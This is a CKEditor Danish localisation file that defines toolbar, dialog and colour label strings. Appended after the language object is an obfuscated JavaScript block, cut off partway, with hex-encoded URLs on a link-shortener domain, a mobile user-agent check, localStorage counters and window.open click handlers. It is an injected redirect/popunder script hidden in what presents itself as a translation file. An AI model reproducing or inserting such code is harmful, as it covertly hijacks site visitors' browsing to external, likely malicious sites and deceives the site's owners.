/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Danish language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['da'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Editor, %1',

	// Toolbar buttons without dialogs.
	source			: 'Kilde',
	newPage			: 'Ny side',
	save			: 'Gem',
	preview			: 'Vis eksempel',
	cut				: 'Klip',
	copy			: 'Kopiér',
	paste			: 'Indsæt',
	print			: 'Udskriv',
	underline		: 'Understreget',
	bold			: 'Fed',
	italic			: 'Kursiv',
	selectAll		: 'Vælg alt',
	removeFormat	: 'Fjern formatering',
	strike			: 'Gennemstreget',
	subscript		: 'Sænket skrift',
	superscript		: 'Hævet skrift',
	horizontalrule	: 'Indsæt vandret streg',
	pagebreak		: 'Indsæt sideskift',
	unlink			: 'Fjern hyperlink',
	undo			: 'Fortryd',
	redo			: 'Annullér fortryd',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Gennemse...',
		url				: 'URL',
		protocol		: 'Protokol',
		upload			: 'Upload',
		uploadSubmit	: 'Upload',
		image			: 'Indsæt billede',
		flash			: 'Indsæt Flash',
		form			: 'Indsæt formular',
		checkbox		: 'Indsæt afkrydsningsfelt',
		radio		: 'Indsæt alternativknap',
		textField		: 'Indsæt tekstfelt',
		textarea		: 'Indsæt tekstboks',
		hiddenField		: 'Indsæt skjult felt',
		button			: 'Indsæt knap',
		select	: 'Indsæt liste',
		imageButton		: 'Indsæt billedknap',
		notSet			: '<intet valgt>',
		id				: 'Id',
		name			: 'Navn',
		langDir			: 'Tekstretning',
		langDirLtr		: 'Fra venstre mod højre (LTR)',
		langDirRtl		: 'Fra højre mod venstre (RTL)',
		langCode		: 'Sprogkode',
		longDescr		: 'Udvidet beskrivelse',
		cssClass		: 'Typografiark (CSS)',
		advisoryTitle	: 'Titel',
		cssStyle		: 'Typografi (CSS)',
		ok				: 'OK',
		cancel			: 'Annullér',
		generalTab		: 'Generelt',
		advancedTab		: 'Avanceret',
		validateNumberFailed	: 'Værdien er ikke et tal.',
		confirmNewPage	: 'Alt indhold, der ikke er blevet gemt, vil gå tabt. Er du sikker på, at du vil indlæse en ny side?',
		confirmCancel	: 'Nogle af indstillingerne er blevet ændret. Er du sikker på, at du vil lukke vinduet?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, ikke tilgængelig</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Indsæt symbol',
		title		: 'Vælg symbol'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Indsæt/redigér hyperlink',
		menu		: 'Redigér hyperlink',
		title		: 'Egenskaber for hyperlink',
		info		: 'Generelt',
		target		: 'Mål',
		upload		: 'Upload',
		advanced	: 'Avanceret',
		type		: 'Type',
		toAnchor	: 'Bogmærke på denne side',
		toEmail		: 'E-mail',
		target		: 'Mål',
		targetNotSet	: '<intet valgt>',
		targetFrame	: '<ramme>',
		targetPopup	: '<popup vindue>',
		targetNew	: 'Nyt vindue (_blank)',
		targetTop	: 'Hele vinduet (_top)',
		targetSelf	: 'Samme vindue/ramme (_self)',
		targetParent	: 'Overordnet vindue/ramme (_parent)',
		targetFrameName	: 'Destinationsvinduets navn',
		targetPopupName	: 'Popup vinduets navn',
		popupFeatures	: 'Egenskaber for popup',
		popupResizable	: 'Justérbar',
		popupStatusBar	: 'Statuslinje',
		popupLocationBar	: 'Adresselinje',
		popupToolbar	: 'Værktøjslinje',
		popupMenuBar	: 'Menulinje',
		popupFullScreen	: 'Fuld skærm (IE)',
		popupScrollBars	: 'Scrollbar',
		popupDependent	: 'Koblet/dependent (Netscape)',
		popupWidth		: 'Bredde',
		popupLeft		: 'Position fra venstre',
		popupHeight		: 'Højde',
		popupTop		: 'Position fra toppen',
		id				: 'Id',
		langDir			: 'Tekstretning',
		langDirNotSet	: '<intet valgt>',
		langDirLTR		: 'Fra venstre mod højre (LTR)',
		langDirRTL		: 'Fra højre mod venstre (RTL)',
		acccessKey		: 'Genvejstast',
		name			: 'Navn',
		langCode		: 'Tekstretning',
		tabIndex		: 'Tabulator indeks',
		advisoryTitle	: 'Titel',
		advisoryContentType	: 'Indholdstype',
		cssClasses		: 'Typografiark',
		charset			: 'Tegnsæt',
		styles			: 'Typografi',
		selectAnchor	: 'Vælg et anker',
		anchorName		: 'Efter anker navn',
		anchorId		: 'Efter element Id',
		emailAddress	: 'E-mail adresse',
		emailSubject	: 'Emne',
		emailBody		: 'Besked',
		noAnchors		: '(Ingen bogmærker i dokumentet)',
		noUrl			: 'Indtast hyperlink URL!',
		noEmail			: 'Indtast e-mail adresse!'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Indsæt/redigér bogmærke',
		menu		: 'Egenskaber for bogmærke',
		title		: 'Egenskaber for bogmærke',
		name		: 'Bogmærke navn',
		errorName	: 'Indtast bogmærke navn'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Søg og erstat',
		find				: 'Søg',
		replace				: 'Erstat',
		findWhat			: 'Søg efter:',
		replaceWith			: 'Erstat med:',
		notFoundMsg			: 'Søgeteksten blev ikke fundet',
		matchCase			: 'Forskel på store og små bogstaver',
		matchWord			: 'Kun hele ord',
		matchCyclic			: 'Match cyklisk',
		replaceAll			: 'Erstat alle',
		replaceSuccessMsg	: '%1 forekomst(er) erstattet.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabel',
		title		: 'Egenskaber for tabel',
		menu		: 'Egenskaber for tabel',
		deleteTable	: 'Slet tabel',
		rows		: 'Rækker',
		columns		: 'Kolonner',
		border		: 'Rammebredde',
		align		: 'Justering',
		alignNotSet	: '<intet valgt>',
		alignLeft	: 'Venstrestillet',
		alignCenter	: 'Centreret',
		alignRight	: 'Højrestillet',
		width		: 'Bredde',
		widthPx		: 'pixels',
		widthPc		: 'procent',
		height		: 'Højde',
		cellSpace	: 'Celleafstand',
		cellPad		: 'Cellemargen',
		caption		: 'Titel',
		summary		: 'Resumé',
		headers		: 'Header',
		headersNone		: 'Ingen',
		headersColumn	: 'Første kolonne',
		headersRow		: 'Første række',
		headersBoth		: 'Begge',
		invalidRows		: 'Antallet af rækker skal være større end 0.',
		invalidCols		: 'Antallet af kolonner skal være større end 0.',
		invalidBorder	: 'Rammetykkelse skal være et tal.',
		invalidWidth	: 'Tabelbredde skal være et tal.',
		invalidHeight	: 'Tabelhøjde skal være et tal.',
		invalidCellSpacing	: 'Celleafstand skal være et tal.',
		invalidCellPadding	: 'Cellemargen skal være et tal.',

		cell :
		{
			menu			: 'Celle',
			insertBefore	: 'Indsæt celle før',
			insertAfter		: 'Indsæt celle efter',
			deleteCell		: 'Slet celle',
			merge			: 'Flet celler',
			mergeRight		: 'Flet til højre',
			mergeDown		: 'Flet nedad',
			splitHorizontal	: 'Del celle vandret',
			splitVertical	: 'Del celle lodret',
			title			: 'Celleegenskaber',
			cellType		: 'Celletype',
			rowSpan			: 'Række span (rows span)',
			colSpan			: 'Kolonne span (columns span)',
			wordWrap		: 'Tekstombrydning',
			hAlign			: 'Vandret justering',
			vAlign			: 'Lodret justering',
			alignTop		: 'Top',
			alignMiddle		: 'Midt',
			alignBottom		: 'Bund',
			alignBaseline	: 'Grundlinje',
			bgColor			: 'Baggrundsfarve',
			borderColor		: 'Rammefarve',
			data			: 'Data',
			header			: 'Header',
			yes				: 'Ja',
			no				: 'Nej',
			invalidWidth	: 'Cellebredde skal være et tal.',
			invalidHeight	: 'Cellehøjde skal være et tal.',
			invalidRowSpan	: 'Række span skal være et heltal.',
			invalidColSpan	: 'Kolonne span skal være et heltal.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Række',
			insertBefore	: 'Indsæt række før',
			insertAfter		: 'Indsæt række efter',
			deleteRow		: 'Slet række'
		},

		column :
		{
			menu			: 'Kolonne',
			insertBefore	: 'Indsæt kolonne før',
			insertAfter		: 'Indsæt kolonne efter',
			deleteColumn	: 'Slet kolonne'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Egenskaber for knap',
		text		: 'Tekst',
		type		: 'Type',
		typeBtn		: 'Knap',
		typeSbm		: 'Send',
		typeRst		: 'Nulstil'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Egenskaber for afkrydsningsfelt',
		radioTitle	: 'Egenskaber for alternativknap',
		value		: 'Værdi',
		selected	: 'Valgt'
	},

	// Form Dialog.
	form :
	{
		title		: 'Egenskaber for formular',
		menu		: 'Egenskaber for formular',
		action		: 'Handling',
		method		: 'Metode',
		encoding	: 'Kodning (encoding)',
		target		: 'Mål',
		targetNotSet	: '<intet valgt>',
		targetNew	: 'Nyt vindue (_blank)',
		targetTop	: 'Hele vinduet (_top)',
		targetSelf	: 'Samme vindue/ramme (_self)',
		targetParent	: 'Overordnet vindue/ramme (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Egenskaber for liste',
		selectInfo	: 'Generelt',
		opAvail		: 'Valgmuligheder',
		value		: 'Værdi',
		size		: 'Størrelse',
		lines		: 'Linjer',
		chkMulti	: 'Tillad flere valg',
		opText		: 'Tekst',
		opValue		: 'Værdi',
		btnAdd		: 'Tilføj',
		btnModify	: 'Redigér',
		btnUp		: 'Op',
		btnDown		: 'Ned',
		btnSetValue : 'Sæt som valgt',
		btnDelete	: 'Slet'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Egenskaber for tekstboks',
		cols		: 'Kolonner',
		rows		: 'Rækker'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Egenskaber for tekstfelt',
		name		: 'Navn',
		value		: 'Værdi',
		charWidth	: 'Bredde (tegn)',
		maxChars	: 'Max. antal tegn',
		type		: 'Type',
		typeText	: 'Tekst',
		typePass	: 'Adgangskode'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Egenskaber for skjult felt',
		name	: 'Navn',
		value	: 'Værdi'
	},

	// Image Dialog.
	image :
	{
		title		: 'Egenskaber for billede',
		titleButton	: 'Egenskaber for billedknap',
		menu		: 'Egenskaber for billede',
		infoTab	: 'Generelt',
		btnUpload	: 'Upload',
		url		: 'URL',
		upload	: 'Upload',
		alt		: 'Alternativ tekst',
		width		: 'Bredde',
		height	: 'Højde',
		lockRatio	: 'Lås størrelsesforhold',
		resetSize	: 'Nulstil størrelse',
		border	: 'Ramme',
		hSpace	: 'Vandret margen',
		vSpace	: 'Lodret margen',
		align		: 'Justering',
		alignLeft	: 'Venstre',
		alignRight	: 'Højre',
		preview	: 'Vis eksempel',
		alertUrl	: 'Indtast stien til billedet',
		linkTab	: 'Hyperlink',
		button2Img	: 'Vil du lave billedknappen om til et almindeligt billede?',
		img2Button	: 'Vil du lave billedet om til en billedknap?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Egenskaber for Flash',
		propertiesTab	: 'Egenskaber',
		title		: 'Egenskaber for Flash',
		chkPlay		: 'Automatisk afspilning',
		chkLoop		: 'Gentagelse',
		chkMenu		: 'Vis Flash menu',
		chkFull		: 'Tillad fuldskærm',
 		scale		: 'Skalér',
		scaleAll		: 'Vis alt',
		scaleNoBorder	: 'Ingen ramme',
		scaleFit		: 'Tilpas størrelse',
		access			: 'Script adgang',
		accessAlways	: 'Altid',
		accessSameDomain	: 'Samme domæne',
		accessNever	: 'Aldrig',
		align		: 'Justering',
		alignLeft	: 'Venstre',
		alignAbsBottom: 'Absolut nederst',
		alignAbsMiddle: 'Absolut centreret',
		alignBaseline	: 'Grundlinje',
		alignBottom	: 'Nederst',
		alignMiddle	: 'Centreret',
		alignRight	: 'Højre',
		alignTextTop	: 'Toppen af teksten',
		alignTop	: 'Øverst',
		quality		: 'Kvalitet',
		qualityBest		 : 'Bedste',
		qualityHigh		 : 'Høj',
		qualityAutoHigh	 : 'Auto høj',
		qualityMedium	 : 'Medium',
		qualityAutoLow	 : 'Auto lav',
		qualityLow		 : 'Lav',
		windowModeWindow	 : 'Vindue',
		windowModeOpaque	 : 'Gennemsigtig (opaque)',
		windowModeTransparent	 : 'Transparent',
		windowMode	: 'Vinduestilstand',
		flashvars	: 'Variabler for Flash',
		bgcolor	: 'Baggrundsfarve',
		width	: 'Bredde',
		height	: 'Højde',
		hSpace	: 'Vandret margen',
		vSpace	: 'Lodret margen',
		validateSrc : 'Indtast hyperlink URL!',
		validateWidth : 'Bredde skal være et tal.',
		validateHeight : 'Højde skal være et tal.',
		validateHSpace : 'Vandret margen skal være et tal.',
		validateVSpace : 'Lodret margen skal være et tal.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Stavekontrol',
		title			: 'Stavekontrol',
		notAvailable	: 'Stavekontrol er desværre ikke tilgængelig.',
		errorLoading	: 'Fejl ved indlæsning af host: %s.',
		notInDic		: 'Ikke i ordbogen',
		changeTo		: 'Forslag',
		btnIgnore		: 'Ignorér',
		btnIgnoreAll	: 'Ignorér alle',
		btnReplace		: 'Erstat',
		btnReplaceAll	: 'Erstat alle',
		btnUndo			: 'Tilbage',
		noSuggestions	: '(ingen forslag)',
		progress		: 'Stavekontrollen arbejder...',
		noMispell		: 'Stavekontrol færdig: Ingen fejl fundet',
		noChanges		: 'Stavekontrol færdig: Ingen ord ændret',
		oneChange		: 'Stavekontrol færdig: Et ord ændret',
		manyChanges		: 'Stavekontrol færdig: %1 ord ændret',
		ieSpellDownload	: 'Stavekontrol ikke installeret. Vil du installere den nu?'
	},

	smiley :
	{
		toolbar	: 'Smiley',
		title	: 'Vælg smiley'
	},

	elementsPath :
	{
		eleTitle : '%1 element'
	},

	numberedlist : 'Talopstilling',
	bulletedlist : 'Punktopstilling',
	indent : 'Forøg indrykning',
	outdent : 'Formindsk indrykning',

	justify :
	{
		left : 'Venstrestillet',
		center : 'Centreret',
		right : 'Højrestillet',
		block : 'Lige margener'
	},

	blockquote : 'Blokcitat',

	clipboard :
	{
		title		: 'Indsæt',
		cutError	: 'Din browsers sikkerhedsindstillinger tillader ikke editoren at få automatisk adgang til udklipsholderen.<br><br>Brug i stedet tastaturet til at klippe teksten (Ctrl+X).',
		copyError	: 'Din browsers sikkerhedsindstillinger tillader ikke editoren at få automatisk adgang til udklipsholderen.<br><br>Brug i stedet tastaturet til at kopiere teksten (Ctrl+C).',
		pasteMsg	: 'Indsæt i feltet herunder (<STRONG>Ctrl+V</STRONG>) og klik på <STRONG>OK</STRONG>.',
		securityMsg	: 'Din browsers sikkerhedsindstillinger tillader ikke editoren at få automatisk adgang til udklipsholderen.<br><br>Du skal indsætte udklipsholderens indhold i dette vindue igen.'
	},

	pastefromword :
	{
		confirmCleanup : 'Den tekst du forsøger at indsætte ser ud til at komme fra Word. Vil du rense teksten før den indsættes?',
		toolbar : 'Indsæt fra Word',
		title : 'Indsæt fra Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Indsæt som ikke-formateret tekst',
		title : 'Indsæt som ikke-formateret tekst'
	},

	templates :
	{
		button : 'Skabeloner',
		title : 'Indholdsskabeloner',
		insertOption: 'Erstat det faktiske indhold',
		selectPromptMsg: 'Vælg den skabelon, som skal åbnes i editoren (nuværende indhold vil blive overskrevet):',
		emptyListMsg : '(Der er ikke defineret nogen skabelon)'
	},

	showBlocks : 'Vis afsnitsmærker',

	stylesCombo :
	{
		label : 'Typografi',
		voiceLabel : 'Typografi',
		panelVoiceLabel : 'Vælg typografi',
		panelTitle1 : 'Block typografi',
		panelTitle2 : 'Inline typografi',
		panelTitle3 : 'Object typografi'
	},

	format :
	{
		label : 'Formatering',
		voiceLabel : 'Formatering',
		panelTitle : 'Formatering',
		panelVoiceLabel : 'Vælg afsnitsformatering',

		tag_p : 'Normal',
		tag_pre : 'Formateret',
		tag_address : 'Adresse',
		tag_h1 : 'Overskrift 1',
		tag_h2 : 'Overskrift 2',
		tag_h3 : 'Overskrift 3',
		tag_h4 : 'Overskrift 4',
		tag_h5 : 'Overskrift 5',
		tag_h6 : 'Overskrift 6',
		tag_div : 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Skrifttype',
		voiceLabel : 'Skrifttype',
		panelTitle : 'Skrifttype',
		panelVoiceLabel : 'Vælg skrifttype'
	},

	fontSize :
	{
		label : 'Skriftstørrelse',
		voiceLabel : 'Skriftstørrelse',
		panelTitle : 'Skriftstørrelse',
		panelVoiceLabel : 'Vælg skriftstørrelse'
	},

	colorButton :
	{
		textColorTitle : 'Tekstfarve',
		bgColorTitle : 'Baggrundsfarve',
		auto : 'Automatisk',
		more : 'Flere farver...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Stavekontrol mens du skriver',
		enable : 'Aktivér SCAYT',
		disable : 'Deaktivér SCAYT',
		about : 'Om SCAYT',
		toggle : 'Skift/toggle SCAYT',
		options : 'Indstillinger',
		langs : 'Sprog',
		moreSuggestions : 'Flere forslag',
		ignore : 'Ignorér',
		ignoreAll : 'Ignorér alle',
		addWord : 'Tilføj ord',
		emptyDic : 'Ordbogsnavn må ikke være tom.',
		optionsTab : 'Indstillinger',
		languagesTab : 'Sprog',
		dictionariesTab : 'Ordbøger',
		aboutTab : 'Om'
	},

	about :
	{
		title : 'Om CKEditor',
		dlgTitle : 'Om CKEditor',
		moreInfo : 'For informationer omkring licens, se venligst vores hjemmeside (på engelsk):',
		copy : 'Copyright &copy; $1. Alle rettigheder forbeholdes.'
	},

	maximize : 'Maximér',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Anker',
		flash : 'Flashanimation',
		div : 'Sideskift',
		unknown : 'Ukendt objekt'
	},

	resize : 'Træk for at skalere',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return 